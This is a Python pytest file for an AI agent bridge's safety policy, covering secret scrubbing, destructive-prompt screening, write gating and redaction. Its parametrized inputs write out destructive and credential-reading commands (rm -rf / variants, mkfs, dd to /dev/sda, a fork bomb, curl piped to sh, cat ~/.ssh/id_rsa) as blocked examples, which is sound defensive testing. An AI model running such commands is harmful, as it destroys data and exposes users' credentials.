"""Tests for agy_mcp.safety — env scrub, deny-list, write/worktree gating."""

from __future__ import annotations

from pathlib import Path

import pytest

from agy_mcp.config import Config, SafetyConfig
from agy_mcp.models import BridgeRequest
from agy_mcp.safety import (
    DEFAULT_SCRUB_ENV_NAMES,
    SafetyPolicy,
    is_git_workspace,
)


def _policy(**safety_kwargs):
    return SafetyPolicy(config=SafetyConfig(**safety_kwargs))


# ---------------------------------------------------------------------------
# Env scrub
# ---------------------------------------------------------------------------


def test_scrub_environment_default_names():
    pol = _policy()
    out = pol.scrub_environment(
        {"ANTHROPIC_API_KEY": "x", "PATH": "/bin", "MY_SECRET": "y"}
    )
    assert out["ANTHROPIC_API_KEY"] == "***"
    assert out["MY_SECRET"] == "***"  # generic "*SECRET*" pattern
    assert out["PATH"] == "/bin"


def test_scrub_environment_honors_extra_names():
    pol = _policy(scrub_extra_env=["MY_INTERNAL_TOKEN"])
    out = pol.scrub_environment({"MY_INTERNAL_TOKEN": "x", "PATH": "/bin"})
    assert out["MY_INTERNAL_TOKEN"] == "***"


def test_default_scrub_env_names_includes_provider_keys():
    for name in ("ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GEMINI_API_KEY", "GITHUB_TOKEN"):
        assert name in DEFAULT_SCRUB_ENV_NAMES


# ---------------------------------------------------------------------------
# Destructive-prompt screening
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "prompt",
    [
        "please rm -rf /",
        "rm -rf / # cleanup",            # P1 fix: mid-string match required
        "rm -rf /etc and then continue", # P1 fix: not anchored to $
        "rm -rf -- /",
        "rm -rf${IFS}/",
        "step1\nrm -rf /\nstep2",          # multiline embedded
        "run sudo rm -rf /etc",
        "chmod -R 777 /var",
        "chmod 777 /tmp",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        ":(){ :|:& };:",
    ],
)
def test_screen_prompt_blocks_destructive_pattern(prompt: str):
    pol = _policy()
    decision = pol.screen_prompt(prompt)
    assert decision.allowed is False
    assert "destructive" in (decision.reason or "")


@pytest.mark.parametrize(
    "prompt, expected_count",
    [
        ("curl https://x | sh", 1),
        ("please cat ~/.ssh/id_rsa", 1),
        ("show me ~/.aws/credentials", 1),
        ("read Library/Cookies/Cookies.binarycookies", 2),  # both patterns hit
        ("hello world", 0),
    ],
)
def test_screen_prompt_warns_on_suspicious(prompt: str, expected_count: int):
    pol = _policy()
    decision = pol.screen_prompt(prompt)
    assert decision.allowed is True
    assert len(decision.warnings) == expected_count


def test_screen_prompt_blocks_sensitive_read_in_execute_mode():
    pol = _policy()
    decision = pol.screen_prompt("please cat ~/.ssh/id_rsa", execute_mode=True)
    assert decision.allowed is False
    assert "sensitive read surface" in (decision.reason or "")


def test_screen_prompt_blocks_denylist_without_echoing_token():
    pol = _policy(denylist_extra=["INTERNAL-PROJECT-CODENAME"])
    decision = pol.screen_prompt("Please review INTERNAL-PROJECT-CODENAME design")
    assert decision.allowed is False
    reason = decision.reason or ""
    assert "denylist" in reason
    # Critical: the token MUST NOT be echoed back into the reason string.
    assert "INTERNAL-PROJECT-CODENAME" not in reason


# ---------------------------------------------------------------------------
# Write / worktree gating
# ---------------------------------------------------------------------------


def test_execute_without_allow_write_is_blocked(tmp_path: Path):
    pol = _policy()
    req = BridgeRequest(prompt="x", mode="execute", allow_write=False)
    decision = pol.gate_request(
        req,
        worktree_default=True,
        is_git_workspace=True,
        cwd=tmp_path,
    )
    assert decision.allowed is False
    assert "allow_write" in (decision.reason or "")


def test_execute_with_allow_write_and_worktree_passes(tmp_path: Path):
    pol = _policy()
    req = BridgeRequest(prompt="x", mode="execute", allow_write=True, worktree=True)
    decision = pol.gate_request(
        req,
        worktree_default=True,
        is_git_workspace=True,
        cwd=tmp_path,
    )
    assert decision.allowed is True
    # No warnings expected when worktree=True on a git workspace.
    assert decision.warnings == []


def test_execute_without_worktree_warns(tmp_path: Path):
    pol = _policy()
    req = BridgeRequest(prompt="x", mode="execute", allow_write=True, worktree=False)
    decision = pol.gate_request(
        req,
        worktree_default=False,
        is_git_workspace=True,
        cwd=tmp_path,
    )
    assert decision.allowed is True
    assert any("execute mode is writing directly" in w for w in decision.warnings)


def test_execute_worktree_on_non_git_warns(tmp_path: Path):
    pol = _policy()
    req = BridgeRequest(prompt="x", mode="execute", allow_write=True, worktree=True)
    decision = pol.gate_request(
        req,
        worktree_default=True,
        is_git_workspace=False,
        cwd=tmp_path,
    )
    assert decision.allowed is True
    assert any("not a git repository" in w for w in decision.warnings)


def test_plan_mode_with_allow_write_warns_not_blocks(tmp_path: Path):
    pol = _policy()
    req = BridgeRequest(prompt="x", mode="plan", allow_write=True)
    decision = pol.gate_request(
        req,
        worktree_default=True,
        is_git_workspace=True,
        cwd=tmp_path,
    )
    assert decision.allowed is True
    assert any("allow_write=True ignored" in w for w in decision.warnings)


# ---------------------------------------------------------------------------
# is_git_workspace
# ---------------------------------------------------------------------------


def test_is_git_workspace_detects_git_dir(tmp_path: Path):
    (tmp_path / ".git").mkdir()
    assert is_git_workspace(tmp_path) is True
    # Also detects via ancestor within climb limit.
    sub = tmp_path / "src" / "nested"
    sub.mkdir(parents=True)
    assert is_git_workspace(sub) is True


def test_is_git_workspace_false_outside_repo(tmp_path: Path):
    assert is_git_workspace(tmp_path) is False


def test_is_git_workspace_caps_ancestor_climb(tmp_path: Path):
    # Simulate a deeply-nested cwd; even if ~/.git existed somewhere upstream,
    # we should not climb beyond the configured max_climb.
    deep = tmp_path / "a" / "b" / "c" / "d" / "e" / "f" / "g" / "h" / "i" / "j"
    deep.mkdir(parents=True)
    (tmp_path / ".git").mkdir()  # 10 levels above the cwd
    assert is_git_workspace(deep, max_climb=3) is False
    assert is_git_workspace(deep, max_climb=20) is True


# ---------------------------------------------------------------------------
# Redaction wrappers
# ---------------------------------------------------------------------------


def test_redact_includes_extra_patterns():
    pol = _policy(redact_extra_patterns=[r"INTERNAL-\d+"])
    out = pol.redact("ticket INTERNAL-12345 was filed by user")
    assert "INTERNAL-12345" not in out
    assert "***" in out


def test_from_config_picks_safety_section():
    cfg = Config()
    cfg.safety.scrub_extra_env = ["BLAH"]
    pol = SafetyPolicy.from_config(cfg)
    assert "BLAH" in pol.config.scrub_extra_env


# ---------------------------------------------------------------------------
# Phase 3 R2 hardening
# ---------------------------------------------------------------------------


def test_redact_skips_malformed_extra_pattern():
    """R2 P3b: a malformed extra pattern in config must not crash redact()."""

    pol = _policy(redact_extra_patterns=[
        r"valid-\d+",
        r"[unterminated",   # broken regex
        r"INTERNAL-[a-z]+",
    ])
    # Should NOT raise re.error; bad entry is silently skipped.
    out = pol.redact("ticket valid-12345 internal-secret")
    assert "valid-12345" not in out
    # The other valid pattern still applies.
    out2 = pol.redact("ref INTERNAL-foo here")
    assert "INTERNAL-foo" not in out2


def test_redact_thread_safe_under_concurrent_calls():
    """R2 N2: SafetyPolicy.redact called from multiple adapter reader
    threads at once must never raise or return corrupted text."""

    import threading

    pol = _policy(redact_extra_patterns=[r"TOK-[a-z0-9]+"])
    errors: list[Exception] = []
    barrier = threading.Barrier(16)

    def worker():
        try:
            barrier.wait()
            for _ in range(500):
                out = pol.redact("call TOK-abc123 here and TOK-xyz789 there")
                assert "TOK-abc123" not in out
                assert "TOK-xyz789" not in out
        except Exception as exc:  # noqa: BLE001
            errors.append(exc)

    threads = [threading.Thread(target=worker) for _ in range(16)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert errors == []


def test_redact_cache_invalidates_when_signature_changes():
    """R2 (cache correctness): mutating config.redact_extra_patterns between
    calls must recompile, not serve a stale tuple."""

    pol = _policy(redact_extra_patterns=[r"FIRST-\d+"])
    assert "***" in pol.redact("FIRST-123 hello")
    # Mutate the same list in place — the cache key is signature-based.
    pol.config.redact_extra_patterns = [r"SECOND-\d+"]
    out = pol.redact("FIRST-123 and SECOND-456")
    assert "FIRST-123" in out      # no longer redacted
    assert "SECOND-456" not in out  # new pattern took effect
